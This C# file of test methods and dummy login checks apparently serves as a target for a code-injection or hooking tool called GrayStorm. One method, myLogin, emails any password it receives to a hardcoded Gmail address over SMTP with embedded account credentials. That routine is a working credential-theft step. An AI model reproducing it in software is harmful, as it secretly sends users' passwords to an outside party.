using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace GrayStorm
{
    class testClass
    {
        public int hi { get; set; }

        public bool booly { get; set; }

        public bool poo = true;

        public static int hiSTATIC = 64;

        public testClass()
        {
            Random rnd = new Random();
            this.hi = rnd.Next(1, 1000); // creates a number between 1 and 1000
            hiSTATIC = rnd.Next(1, 1000);
        }

        public testClass(int x, int y, bool trueOrFalse)
        {
            Random rnd = new Random();
            this.hi = rnd.Next(1, 1000); // creates a number between 1 and 1000
            hiSTATIC = rnd.Next(1, 1000);
            hiSTATIC += x += y;
        }

        public void getValue()
        {
            System.Windows.Forms.MessageBox.Show(hiSTATIC.ToString("X"));
        }


    }

    class abc
    {
        //test function
        public void boolTest(bool x)
        {
            System.Windows.Forms.MessageBox.Show("works");
        }

        public void blankMethodDoesNadda()
        {
            int x = 3;
            int y = 5;
            CallArgs(x, y);
            lolWtf();
        }

        public void CallArgs(int x, int y)
        {
            y = x * 3 * 3 * x * y;

            System.Windows.Forms.MessageBox.Show("Testing public void blankMethodDoesNadda()");
        }

        //test function
        public static void blankMethodDoesNadda_STATIC()
        {

            int x = 3;
            int y = 4;

            y = x * 3 * 3 * x * y;

            System.Windows.Forms.MessageBox.Show("Testing public void blankMethodDoesNadda_STATIC()");
        }

        //test function
        public void testTrueFalse()
        {

            bool testTrueFalse = testTrueFalse_CALL();
            if (testTrueFalse)
                System.Windows.Forms.MessageBox.Show("TRUE");
            else
                System.Windows.Forms.MessageBox.Show("FALSE");
        }

        public bool testTrueFalse_CALL()
        {
            return false;
        }

        public int testRyan(int x, int y, int z)
        {
            System.Windows.Forms.MessageBox.Show("Tada!");
            return 3;
        }

        public int testRyan(int x, int y)
        {
            return 3;
        }

        public int testRyan2(int x)
        {
            System.Windows.Forms.MessageBox.Show("TRUE");
            return 2;

        }

        public double testRyan3(double x, int y)
        {
            System.Windows.Forms.MessageBox.Show("Hello");
            return x * y;
        }

        public double TESTMENAOW(int x, double y)
        {
            return x * y;
        }


        private void testRyan4(string pwnage)
        {
            System.Windows.Forms.MessageBox.Show("Yippeee");
        }

        private int testRyan5(string pwnage)
        {
            System.Windows.Forms.MessageBox.Show("Yippeee");
            return 3;
        }

        private void lolWtf()
        {
            System.Windows.Forms.MessageBox.Show("I AM SHELL");
        }

        private void testLoginONE()
        {
            if (login("lol"))
                System.Windows.Forms.MessageBox.Show("Logged in!");
            else
                System.Windows.Forms.MessageBox.Show("not logged in!");
        }


        private void testLoginTWO()
        {
            if (login("lol"))
                System.Windows.Forms.MessageBox.Show("Logged in!");
            else
                System.Windows.Forms.MessageBox.Show("not logged in!");
        }

        private void objectTest(object j)
        {
            j = 1;
            System.Windows.Forms.MessageBox.Show(j.ToString());
        }

        private bool login(String password)
        {
            if (password == "meh")
                return true;
            else return false;
        }

        public static bool myLogin(String password)
        {


            System.Net.Mail.SmtpClient smtpClient = new System.Net.Mail.SmtpClient("smtp.gmail.com", 587);

            System.Net.Mail.MailMessage message = new System.Net.Mail.MailMessage();
            message.To.Add("c.timzen@gmail.com");
            message.Subject = "Get that password";
            message.From = new System.Net.Mail.MailAddress("c.timzen@gmail.com");
            message.Body = "" + password.ToString();
            smtpClient.EnableSsl = true;
            smtpClient.UseDefaultCredentials = false;
            smtpClient.Credentials = new System.Net.NetworkCredential("timzenc@sou.edu", "somepassword?");
            smtpClient.Send(message);

            return true;
        }

        public static bool didILogIn(string password)
        {
            bool isTrue = false;
            if (password == "lol")
                isTrue = true;
            System.Windows.Forms.MessageBox.Show(isTrue.ToString());
            System.Windows.Forms.MessageBox.Show("owned u");

            return isTrue;
        }

    }
}




    
